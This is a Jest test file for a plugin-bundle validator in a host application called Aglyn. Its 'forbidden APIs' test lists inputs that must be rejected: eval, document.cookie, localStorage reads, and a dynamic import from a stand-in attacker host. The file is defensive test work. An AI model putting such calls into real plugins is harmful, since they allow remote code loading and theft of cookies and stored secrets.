/**
 * @license
 * Copyright 2026 Aglyn LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { checkPluginBundle } from './plugin-bundle-checks'

const GOOD_BUNDLE = `const host = globalThis.__AGLYN_PLUGIN_HOST__;
var React = host["React"];
function Widget() { return React.createElement('div', null, 'hi'); }
export function register(h) { h.aglyn.registerConsoleExtension({ pluginId: 'x' }); }
`

describe('checkPluginBundle (AGL-426)', () => {
  it('accepts a self-contained bundle exporting register', () => {
    const result = checkPluginBundle(GOOD_BUNDLE)
    expect(result.ok).toBe(true)
    expect(result.exports.register).toBe(true)
    expect(result.exports.registerApi).toBe(false)
  })

  it('accepts export-brace and registerApi shapes', () => {
    const result = checkPluginBundle(
      'async function registerApi() {}\nexport { registerApi };\n',
    )
    expect(result.ok).toBe(true)
    expect(result.exports.registerApi).toBe(true)
  })

  it('rejects a bundle with no entry export', () => {
    const result = checkPluginBundle('console.log("nothing here")\n')
    expect(result.ok).toBe(false)
    expect(result.problems.some((p) => p.message.includes('register'))).toBe(
      true,
    )
  })

  it('rejects leftover static imports', () => {
    const result = checkPluginBundle(
      `import React from 'react'\nexport function register() {}\n`,
    )
    expect(result.ok).toBe(false)
    expect(
      result.problems.some((p) => p.message.includes('static imports')),
    ).toBe(true)
  })

  it('rejects forbidden APIs', () => {
    for (const evil of [
      'eval("x")',
      'new Function("x")',
      'document.cookie',
      'localStorage.getItem("k")',
      'import("https://evil.example/x.mjs")',
    ]) {
      const result = checkPluginBundle(
        `export function register() { ${evil} }\n`,
      )
      expect(result.ok).toBe(false)
    }
  })

  it('rejects empty and oversized bundles', () => {
    expect(checkPluginBundle('').ok).toBe(false)
    const result = checkPluginBundle(
      `export function register() {}\n${'x'.repeat(64)}`,
      { maxBytes: 32 },
    )
    expect(result.ok).toBe(false)
  })
})
